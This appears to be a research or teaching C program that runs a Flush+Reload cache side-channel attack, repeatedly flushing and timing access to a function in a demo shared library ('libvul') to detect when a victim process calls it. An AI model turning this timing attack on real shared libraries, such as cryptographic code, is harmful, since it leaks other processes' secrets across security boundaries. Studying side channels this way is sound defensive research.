#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>
#include "../cacheutils.h"

// /usr/lib/libvul
int add(int, int);
int sub(int, int);
// /usr/lib/libvul2
int mul(int, int);
int div(int, int);

int main(int argc, char **argv) {

  size_t threshold;
  size_t start, end;

  if(argc != 1){
          printf("Usage: %s \n", argv[0]);
  }

  threshold = detect_flush_reload_threshold();

  printf("LLC miss threshold: %ld\n", threshold);

  // Select target function in shared lib
  void *addr = (void *)sub;

  for(;;){
    flush((void *)addr);

    delayloop(100000);

    start = rdtsc();
    maccess((void *)addr);
    end = rdtsc();

    if(end-start < threshold)
      printf("victim access a target function()!...\n");

  }

  return 0;
}
